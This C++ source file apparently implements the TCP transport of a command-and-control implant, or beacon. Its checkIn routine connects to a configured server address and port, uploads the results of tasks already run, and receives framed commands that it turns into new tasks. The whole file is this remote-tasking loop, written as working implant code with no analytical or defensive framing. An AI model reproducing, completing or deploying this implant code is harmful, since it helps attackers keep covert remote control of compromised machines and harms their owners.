#include "BeaconTcp.hpp"
#include <SocketClient.hpp>

using namespace std;


BeaconTcp::BeaconTcp(std::string& config, std::string& ip, int port)
    : Beacon()
{
    m_ip = ip;
    m_port = port;

    // beacon and modules config
    initConfig(config);

    m_client=new SocketTunnelClient();
}


BeaconTcp::~BeaconTcp()
{
    delete m_client;
}


void BeaconTcp::checkIn()
{    
    int ret = m_client->init(m_ip, m_port);

    if(ret)
    {
        std::string output;
        taskResultsToCmd(output);

        output.append(TcpFrameBuffer::delimiter());

        std::string input;
        int res = m_client->process(output, input);

        if(res<=0)
        {
            m_client->reset();
            m_frames.reset();
        }
        else if(!input.empty())
        {
            std::vector<std::string> frames;
            if (!m_frames.append(input, frames))
            {
                m_client->reset();
                return;
            }

            for(const auto& frame : frames)
                cmdToTasks(frame);
        }

    }
}

    



